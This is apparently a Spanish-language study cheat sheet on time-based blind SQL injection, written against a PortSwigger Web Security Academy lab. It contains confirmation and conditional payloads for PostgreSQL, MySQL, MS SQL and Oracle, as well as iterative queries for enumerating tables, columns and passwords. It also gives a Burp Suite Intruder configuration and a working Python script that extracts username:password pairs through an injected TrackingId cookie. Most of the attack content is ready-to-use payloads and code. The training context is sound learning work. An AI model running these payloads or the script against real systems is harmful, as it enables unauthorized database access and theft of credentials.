
---
Tags: #time #sqli

---
# 🕵️ Guía Maestra: Blind SQL Injection (Time-Based) v2

La inyección basada en tiempo es la técnica "de último recurso". Se utiliza cuando la aplicación no devuelve datos ni errores, pero podemos medir cuánto tarda el servidor en responder.

---

## 1. Fase de Detección: ¿Es vulnerable?

El primer paso es confirmar la vulnerabilidad inyectando una pausa. Si la respuesta del servidor se retrasa el tiempo indicado, la vulnerabilidad existe.

### Tabla de Payloads de Confirmación

| **SGBD**       | **Payload de Prueba**                          | **Explicación**                            |
| -------------- | ---------------------------------------------- | ------------------------------------------ |
| **PostgreSQL** | `KwTG899Hl3TwsMFW' \|\| pg_sleep(10)-- -`      | Concatenación + función de sueño.          |
| **MySQL**      | `' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--` | Usa `SLEEP()` dentro de una subconsulta.   |
| **MS SQL**     | `'; WAITFOR DELAY '0:0:10'--`                  | Usa el comando específico `WAITFOR DELAY`. |
| **Oracle**     | `' AND 1=dbms_pipe.receive_message('a',10)--`  | Usa el paquete `dbms_pipe` para esperar.   |

---

## 2. Fase Avanzada: Estructuras Condicionales

Usamos estas plantillas para envolver nuestras consultas de extracción.

| **SGBD**       | **Sintaxis Condicional (Template)**                                                                    |
| -------------- | ------------------------------------------------------------------------------------------------------ |
| **PostgreSQL** | `' \|\| (SELECT CASE WHEN (CONDICION) THEN pg_sleep(10) ELSE pg_sleep(0) END) \|\| '`                  |
| **MySQL**      | `' AND IF(CONDICION, SLEEP(10), 1)--`                                                                  |
| **MS SQL**     | `'; IF (CONDICION) WAITFOR DELAY '0:0:10'--`                                                           |
| **Oracle**     | `' AND (SELECT CASE WHEN (CONDICION) THEN dbms_pipe.receive_message('a',10) ELSE 'a' END FROM dual)--` |

---

## 3. Diccionario de Consultas con Iteración (LIMIT/OFFSET)

Sustituye `CONDICION` por estas sentencias. Usa **§0§** para la fila, **§1§** para la posición del carácter y **§a§** para el carácter.

### A. Listar Tablas (Iterando con §0§)

| **SGBD**       | **Consulta para la Condición (Iterativa)**                                                                                                        |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PostgreSQL** | `(SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables LIMIT 1 OFFSET §0§)='§a§'`                                                    |
| **MySQL**      | `(SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT §0§,1)='§a§'`                             |
| **MS SQL**     | `(SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as r FROM sysobjects WHERE xtype='U') t WHERE r=§0§+1)='§a§'` |
| **Oracle**     | `(SELECT SUBSTR(t,§1§,1) FROM (SELECT table_name as t, ROWNUM as r FROM all_tables) WHERE r=§0§+1)='§a§'`                                         |

### B. Listar Columnas (de una tabla específica)

| **SGBD**       | **Consulta para la Condición (Iterativa)**                                                                                                                    |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PostgreSQL** | `(SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §0§)='§a§'`                                     |
| **MySQL**      | `(SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT §0§,1)='§a§'`                                            |
| **MS SQL**     | `(SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as r FROM syscolumns WHERE id=OBJECT_ID('users')) t WHERE r=§0§+1)='§a§'` |

### C. Extraer Datos (Ejemplo: Passwords)

| **SGBD**       | **Consulta para la Condición (Iterativa)**                                                           |
| -------------- | ---------------------------------------------------------------------------------------------------- |
| **PostgreSQL** | `(SELECT SUBSTRING(password,§1§,1) FROM users LIMIT 1 OFFSET §0§)='§a§'`                             |
| **MySQL**      | `(SELECT SUBSTRING(password,§1§,1) FROM users LIMIT §0§,1)='§a§'`                                    |
| **Oracle**     | `(SELECT SUBSTR(password,§1§,1) FROM (SELECT password, ROWNUM as r FROM users) WHERE r=§0§+1)='§a§'` |

---

## 4. Configuración en Burp Suite (Cluster Bomb)

Para extraer automáticamente usando estos apuntes, configura tus **Payload Sets**:

1. **Payload 1 (§0§ - Fila):** Tipo "Numbers". De 0 a 20 (para ver las primeras 20 tablas/filas).
    
2. **Payload 2 (§1§ - Posición):** Tipo "Numbers". De 1 a 30 (longitud del nombre).
    
3. **Payload 3 (§a§ - Carácter):** Tipo "Simple List". Diccionario `a-z, 0-9, _`.
    

---

## 💡 Tips Finales

- **Ajuste de Fila:** En MySQL y Postgres el offset empieza en **0**. En MSSQL y Oracle (con ROWNUM) se suele ajustar sumando 1 porque las filas se cuentan desde 1.
    
- **Filtrado en Burp:** Activa la columna **"Response received"** en la pestaña de resultados y ordena de mayor a menor para ver los aciertos (peticiones de >10s).


---

## Script en Python para enumerar la base de datos(Tablas, columnas, BBDD, datos) solo cambiando la condición de Blind SQLi basado en tiempo:

```python
import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor

# ==========================================================
# CONFIGURACIÓN DEL OBJETIVO
# ==========================================================
URL = "https://0a930016030f0d0580ecd524004f0069.web-security-academy.net/filter?category=Gifts"
TRACKING_ID_BASE = "hePKxag10TflyebE"
SESSION_ID = "5kf5ip1XZGTUJ6Qxq8C2D6xaw3RYWteB"

# Configuración de tiempos
SLEEP_TIME = 3   # Segundos en pg_sleep
THRESHOLD = 2    # Ajustado al mismo tiempo del sleep para evitar falsos positivos
TIMEOUT = 10     # Tiempo máximo de espera de la petición

# Diccionario de búsqueda
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_,:$"
THREADS = 15      # Recomendado 1 para Time-Based para evitar saturar el servidor

# ==========================================================
# LÓGICA DE EXTRACCIÓN
# ==========================================================

def check_char(fila, pos, char):
    # Usamos la lógica de concatenación || para PostgreSQL
    condicion = f"(SELECT SUBSTRING(username || ':' || password,{pos},1) FROM users LIMIT 1 OFFSET {fila})='{char}'"
    payload = f"{TRACKING_ID_BASE}' || (SELECT CASE WHEN ({condicion}) THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END) || '"
    
    cookies = {
        "TrackingId": payload,
        "session": SESSION_ID
    }

    start_time = time.time()
    try:
        # Realizamos la petición
        requests.get(URL, cookies=cookies, timeout=TIMEOUT)
        elapsed = time.time() - start_time
        
        # Si el tiempo de respuesta es >= al sleep, hemos acertado
        if elapsed >= THRESHOLD:
            return char
    except Exception:
        # En ataques de tiempo, un timeout del script suele ser un acierto
        return char
    return None

def start_extraction():
    print("[*] Iniciando extracción Time-Based en PostgreSQL...")
    
    for fila in range(0, 5):
        extracted_data = ""
        print(f"\n[+] Registro #{fila + 1}: ", end="", flush=True)
        
        for pos in range(1, 50):
            found_char = None
            
            # Nota: En Time-Based, usar muchos hilos suele dar falsos positivos.
            # Si falla, cambia THREADS a 1.
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                futures = [executor.submit(check_char, fila, pos, c) for c in CHARSET]
                for future in futures:
                    res = future.result()
                    if res:
                        found_char = res
                        break
            
            if found_char:
                extracted_data += found_char
                print(found_char, end="", flush=True)
            else:
                break
        
        if not extracted_data:
            print("\n[*] No se encontraron más registros.")
            break

if __name__ == "__main__":
    start_extraction()
```


---
# Referencias

Cheat Sheet de Burpsuite: [Enlace](https://portswigger.net/web-security/sql-injection/cheat-sheet)